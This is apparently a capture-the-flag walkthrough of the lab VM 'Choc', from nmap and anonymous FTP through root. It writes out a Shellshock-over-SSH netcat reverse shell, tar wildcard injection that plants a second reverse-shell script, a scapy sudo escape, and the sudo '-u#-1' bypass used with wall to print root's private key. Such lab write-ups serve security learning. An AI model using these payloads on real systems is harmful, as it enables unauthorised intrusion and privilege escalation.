# Choc

:::note

[Linux VM] [Tested on VirtualBox] created by || cromiphi

⏲️ Release Date // 2021-04-22

✔️ MD5 // 8d4d2817622e1185dc00533b07745aa9

☠ Root // 29

💀 User // 31

📝Notes //
Hack and fun.

:::

## 靶机启动

靶机 IP

```plaintext
192.168.56.122
```

## nmap 信息搜集

```plaintext
Nmap scan report for 192.168.56.122
Host is up (0.00049s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxrwxrwx    1 0        0            1811 Apr 20  2021 id_rsa [NSE: writeable]
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.56.102
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 c5:66:48:ee:7b:a9:ef:e1:20:26:c5:a8:bf:c5:4d:5c (RSA)
|   256 80:46:cd:47:a1:ce:a7:fe:56:36:4f:f7:d1:ed:92:c0 (ECDSA)
|_  256 a2:83:db:7a:7d:38:70:e6:00:16:71:29:ee:04:73:aa (ED25519)
```

## ftp 匿名登陆

```shell
ftp> ls -lah
drwxr-xr-x    2 0        114          4096 Apr 20  2021 .
drwxr-xr-x    2 0        114          4096 Apr 20  2021 ..
-rwxrwxrwx    1 0        0            1811 Apr 20  2021 id_rsa
```

将 `id_rsa` 这个文件下载到本地，将其中的数据进行 `Base64` 解码，并提取可视字符串，得到

```plaintext
carl@choc
```

## User - carl

```shell
┌─[randark@parrot]─[~]
└──╼ $ ssh carl@192.168.56.122 -i id_rsa


##############################
#                            #
#       Welcome to my SSH !  #
#       Carl.                #
#                            #
##############################






        ███████╗ █████╗ ██╗██╗     ███████╗██████╗     ██╗      ██████╗ ██╗
        ██╔════╝██╔══██╗██║██║     ██╔════╝██╔══██╗    ██║     ██╔═══██╗██║
        █████╗  ███████║██║██║     █████╗  ██║  ██║    ██║     ██║   ██║██║
        ██╔══╝  ██╔══██║██║██║     ██╔══╝  ██║  ██║    ██║     ██║   ██║██║
        ██║     ██║  ██║██║███████╗███████╗██████╔╝    ███████╗╚██████╔╝███████╗
        ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═════╝     ╚══════╝ ╚═════╝ ╚══════╝



Connection to 192.168.56.122 closed.
```

看起来是成功登陆了，但是不知道为何直接拦截出去了

尝试借助 Bash shellshock 漏洞，以及 [bash - how can shellshock be exploited over SSH? - Unix & Linux Stack Exchange](https://unix.stackexchange.com/questions/157477/how-can-shellshock-be-exploited-over-ssh)

参考直接执行反弹 shell

```shell
┌─[randark@parrot]─[~]
└──╼ $ ssh carl@192.168.56.122 -i id_rsa '() { :;}; nc 192.168.56.102 9999 -e /bin/bash'
```

## User - carl

```shell
┌─[randark@parrot]─[~]
└──╼ $ pwncat-cs -lp 9999
[13:19:31] Welcome to pwncat 🐈!
[13:21:21] received connection from 192.168.56.122:50414
[13:21:21] 0.0.0.0:9999: normalizing shell path
[13:21:22] 192.168.56.122:50414: registered new host w/ db
(local) pwncat$ back
(remote) carl@choc:/home/carl$ whoami
carl
```

### 环境探测

根据 `/home` 目录下的结构，可以得知有三个用户

```plaintext
carl
sarah
torki
```

并且探测到一个文件

```plaintext title="/home/torki/secret_garden/diary.txt"
April 18th 2021
Last night I dreamed that I was at the beach with scarlett johansson, worst wake up call of my life!

September 12th 2309
I invented a time machine.The world is still crazy, territorial and proud !!

A day in -4.5000000000
The human doesn't exist yet and that's fucking great!!! but I'm a little bored...
```

同时尝试探测有哪些文件的所有者是 `torki`

```shell title="find / -user torki 2>/dev/null"
/home/torki
/home/torki/.profile
/home/torki/.selected_editor
/home/torki/secret_garden
/home/torki/secret_garden/diary.txt
/home/torki/.bash_logout
/home/torki/.bashrc
/home/torki/.gnupg
/home/torki/.local
/home/torki/.local/share
/home/torki/.ssh
/home/torki/backup.sh
/tmp/backup_home.tgz
```

分析 `/tmp/backup_home.tgz` 文件的内容，就是 `/home/torki/secret_garden/diary.txt` 这个文件

## 借助 tar 进行提权

```shell
(remote) carl@choc:/home/torki$ echo '' > secret_garden/--checkpoint=1
(remote) carl@choc:/home/torki$ echo ''>'secret_garden/--checkpoint-action=exec=sh pwn.sh'
(remote) carl@choc:/home/torki$ echo 'nc 192.168.56.102 8888 -e /bin/bash' > secret_garden/pwn.sh
(remote) carl@choc:/home/torki$ chmod +x secret_garden/pwn.sh
```

通过构建以上参数，就可以实现在 tar 的命令行中植入恶意参数，从而实现命令执行

## User - torki

```shell
┌─[randark@parrot]─[~]
└──╼ $ pwncat-cs -lp 8888
[23:57:42] Welcome to pwncat 🐈!
[23:58:01] received connection from 192.168.56.122:40952
[23:58:01] 0.0.0.0:8888: normalizing shell path
           192.168.56.122:40952: registered new host w/ db
(local) pwncat$ back
(remote) torki@choc:/home/torki/secret_garden$ whoami
torki
```

### 环境探测

```plaintext title="sudo -l"
User torki may run the following commands on choc:
    (sarah) NOPASSWD: /usr/bin/scapy
```

scapy 就是一个 Python 环境，所以很容易就能实现横向越权

## User - sarah

```shell
(remote) torki@choc:/home/torki/secret_garden$ sudo -u sarah /usr/bin/scapy
WARNING: Cannot read wireshark manuf database
INFO: Can't import matplotlib. Won't be able to plot.
INFO: Can't import PyX. Won't be able to use psdump() or pdfdump().
WARNING: Failed to execute tcpdump. Check it is installed and in the PATH
WARNING: No route found for IPv6 destination :: (no default route?)
INFO: Can't import python-cryptography v1.7+. Disabled WEP decryption/encryption. (Dot11)
INFO: Can't import python-cryptography v1.7+. Disabled IPsec encryption/authentication.
WARNING: IPython not available. Using standard Python shell instead.
AutoCompletion, History are disabled.

                     aSPY//YASa
             apyyyyCY//////////YCa       |
            sY//////YSpcs  scpCY//Pp     | Welcome to Scapy
 ayp ayyyyyyySCP//Pp           syY//C    | Version 2.4.0
 AYAsAYYYYYYYY///Ps              cY//S   |
         pCCCCY//p          cSSps y//Y   | https://github.com/secdev/scapy
         SPPPP///a          pP///AC//Y   |
              A//A            cyP////C   | Have fun!
              p///Ac            sC///a   |
              P////YCpc           A//A   | Craft packets like it is your last
       scccccp///pSP///p          p//Y   | day on earth.
      sY/////////y  caa           S//P   |                      -- Lao-Tze
       cayCyayP//Ya              pY/Ya   |
        sY/PsY////YCc          aC//Yp
         sc  sccaCY//PCypaapyCP//YSs
                  spCPY//////YPSps
                       ccaacs

>>> import pty
>>> pty.spawn("/bin/bash")
sarah@choc:/home/torki/secret_garden$ whoami
sarah
```

### flag - user

```shell
sarah@choc:~$ cat user.txt
commenquaded
```

### 环境探测

```plaintext title="sudo -l"
User sarah may run the following commands on choc:
    (ALL, !root) NOPASSWD: /usr/bin/wall
```

```plaintext title="/home/sarah/.note.txt"
fuckmeplease
```

```plaintext title="/home/sarah/quotes.txt"
 “You must have chaos within you to give birth to a dancing star.”

 “It is not a lack of love, but a lack of friendship that makes unhappy marriages.”

 “The multiplication of our kind borders on the obscene; the duty to love them, on the preposterous.”

“We do not die because we have to die; we die because one day, and not so long ago, our consciousness was forced to deem it necessary.“

“Luke, I am your father"
```

### sudo 版本可导致绕过

```shell
sarah@choc:/home/torki/.ssh$ sudo --version
Sudo version 1.8.23
Sudoers policy plugin version 1.8.23
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.23
sarah@choc:/home/torki/.ssh$ sudo -l
User sarah may run the following commands on choc:
    (ALL, !root) NOPASSWD: /usr/bin/wall
```

可以定位到 [sudo 1.8.27 - Security Bypass](https://www.exploit-db.com/exploits/47502)

尝试借此进行利用

:::warning

这里利用 wall 程序读取文件，原理是将文件的数据读取出来作为信息，发送给所有登录的用户，这里包括 SSH 和 tty 登陆的用户，不包含反弹 shell 登录的用户，所以建议在前面的用户中找到 id_rsa 文件，并借此建立 SSH 会话

:::

```shell
sarah@choc:/home/torki/.ssh$ sudo -u#-1 /usr/bin/wall --nobanner /root/.ssh/id_rsa
```

在另外一个终端中，收到 wall 群发的消息

```plaintext
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAuSMhRxXhWoexxyZWPK4pkjyVHhT1jAmUYdEhKEFBLZh9z93ZW25M
lrj03xjFd4zP5AAHEG9p5h5SNi3ltHTtml7Nj59XlV6Heru/cwX7Yykxu75tZRxzQR4EjV
qUmxvqJgfql+XzKg3JgNwHRpG3tcW8Rdxbb3owVR97kjZP+3kA/pQGrQKdFe893Q1u2oDa
4R+v+jsYmzwjf/1M8m/S+J0hYzTOI+kQlBnZmMvpJYDidmyG1RO3dcLCpxCQpydH7GfO/s
6j0DdCvDr6+8C4eAzgDE5irjdMh2dKySNveNiMuhzsv1PS33ZWgx/ITlxu9zwiuufQm6D5
TcDYKMGCSQAAA8DHBCmTxwQpkwAAAAdzc2gtcnNhAAABAQC5IyFHFeFah7HHJlY8rimSPJ
UeFPWMCZRh0SEoQUEtmH3P3dlbbkyWuPTfGMV3jM/kAAcQb2nmHlI2LeW0dO2aXs2Pn1eV
Xod6u79zBftjKTG7vm1lHHNBHgSNWpSbG+omB+qX5fMqDcmA3AdGkbe1xbxF3FtvejBVH3
uSNk/7eQD+lAatAp0V7z3dDW7agNrhH6/6OxibPCN//Uzyb9L4nSFjNM4j6RCUGdmYy+kl
gOJ2bIbVE7d1wsKnEJCnJ0fsZ87+zqPQN0K8Ovr7wLh4DOAMTmKuN0yHZ0rJI2942Iy6HO
y/U9LfdlaDH8hOXG73PCK659CboPlNwNgowYJJAAAAAwEAAQAAAQAQK31QlBymp4tjdXm6
uwtudlQf2HzJylxnXriip3Bl5xe1/A5r6epOj8Dza1pz4pyVsVrsmI6LRsKvcLrLVBscjI
MvtB8WMLdshNFn3nHia0qoty0e06lNWq3TGsI3+ewtfiuDMNZYKfQbiRwpkbiV67tR7rkd
t3JZPPKyBoRd1kGjnPzJc2DPyaAtJtS21w86ZxJZtaMWUL6SE1+80VWv0XXPtlmAipfdgF
76A/Z4izCNolx0s+Ptus8gqaxJDeGI4xX5aZZ33kc5cSvNjI2hH6kFX39sS7beVz/zYDKA
BkJ0fZpNQ+HZfqGvT93YHAFZVpdlv7ysn16oNkOwZuZxAAAAgQCs/OtmKQ2SXR0ZrVryDk
58HSK2xCRcMaOqNamWSm+JaKEusms25bCD3liQGbazJyy6eS7iR2DOQPYwdU94dak72X+W
xwOexz8pwHGflvrA7SlKW4pXshuccpxgdC/KkqZRQyQvy7NbDTyGM+3uTQSnABmZWl8mJa
NtfY+fCEoKDgAAAIEA5urQzWNxzvBa4krknAuUMRD8TcsL4NjE6QCj9D1KJh2vGiBqNYjH
f6hZ+4LPFlaWiusjxZAF6vIaZJU0UHRzdcITqm1L20CZQr2D3tgWS6+VAGQHb1me5uoC4J
6Px6A7preSEjS2GtECqWxZevl8YqWEJtWaO1WDK61+Mr266UsAAACBAM0/S7QUbRqSmNTq
wd/4y9U4JxtOfeV4O0I+JNlTPkA2vdUeHEwWkKRqk3re72JwYlUAsD4AhXO1oEdfpO32fx
wavKtBNMpI64CiNVrPY8w9DPoWdCzxtFeRq1V50i9wdiVlHIdn0Ac+6T9Wv/0v8J7GXIkH
gskjOtELMuhigHo7AAAACXJvb3RAY2hvYwE=
-----END OPENSSH PRIVATE KEY-----
```

## User - root

```shell
┌─[randark@parrot]─[~/tmp]
└──╼ $ ssh -i root_id_rsa root@192.168.56.122


##############################
#                            #
#       Welcome to my SSH !  #
#       Carl.                #
#                            #
##############################


Linux choc 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Apr 22 20:20:23 2021
root@choc:~# whoami
root
```

### flag - root

```shell
root@choc:~# cat r00t.txt
inesbywal
```
